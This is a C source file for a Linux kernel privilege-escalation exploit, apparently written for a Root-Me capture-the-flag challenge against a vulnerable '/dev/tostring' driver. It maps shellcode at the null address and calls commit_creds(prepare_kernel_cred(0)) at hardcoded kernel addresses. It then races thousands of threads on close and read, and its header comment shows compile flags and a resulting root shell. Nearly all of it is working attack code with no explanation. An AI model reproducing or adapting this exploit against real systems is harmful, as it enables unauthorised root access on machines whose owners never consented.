/*
    On a linux machine:
    vagrant@ubuntu-focal:~$ gcc -o exploit race_condition.c -fno-stack-protector -z execstack -pthread -static

    On the target: 
    Several restarts could be needed.
    Root-Me user@linkern-chall:~$ /mnt/share/exploit
    [+] mmapping at null address
    [+] mmap success
    [+] Copying lpe shellcode
    [+] shellcode set at null address. Let's try to execute it
    [+] Trying to win the race between close and read...
    [+] Seems like you're root
    /home/user # id
    uid=0(root) gid=0 

 */

#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>

#define DEV "/dev/tostring"
#define NB_RACE 100000

void exploit();
void shell();
void root_creds();
void *trigger();

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)0xffffffff8107ab70;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)0xffffffff8107af00;

void root_creds() {
  commit_creds(prepare_kernel_cred(0));
}

void shell(){
    char *shell = "/bin/sh";
    char *args[] = {shell, "-i", NULL};
    execve(shell, args, NULL);
}

void *trigger() { 
      char b[4];
      int fd;
      fd = open(DEV, O_RDWR);
      if (fd < 0) {
        perror("[!] Failed to open device");
      }
      read(fd, b, sizeof(b));
      close(fd);

      if (getuid() != 0 ){ 
        return NULL;
      }

      printf("[+] Seems like you're root\n");
    
      shell();
      return NULL;
}
    
void exploit() {
    printf("[+] Trying to win the race between close and read...\n");
    
    pthread_t t;
    for (int i = 0; i < NB_RACE; i++) {
      pthread_create(&t, NULL, trigger, NULL);
    }
    
    for (int i = 0; i < NB_RACE; i++) {
      pthread_detach(t);
   }
}

int main(void) {
    printf("[+] mmapping at null address\n");
    char* map = NULL;
    map = mmap((void*)0x0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,
                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    if (map == MAP_FAILED) {
      perror("[!] Failed to mmap");
      return -1;
    }

    printf("[+] mmap success\n");    
    printf("[+] Copying lpe shellcode\n");

    map[0] = '\xff';
    map[1] = '\x25';
    *(unsigned long *)&map[2] = 0;
    *(unsigned long *)&map[6] = (unsigned long)&root_creds;

    printf("[+] shellcode set at null address. Let's try to execute it\n");    

    exploit();
    
    return 0;
}

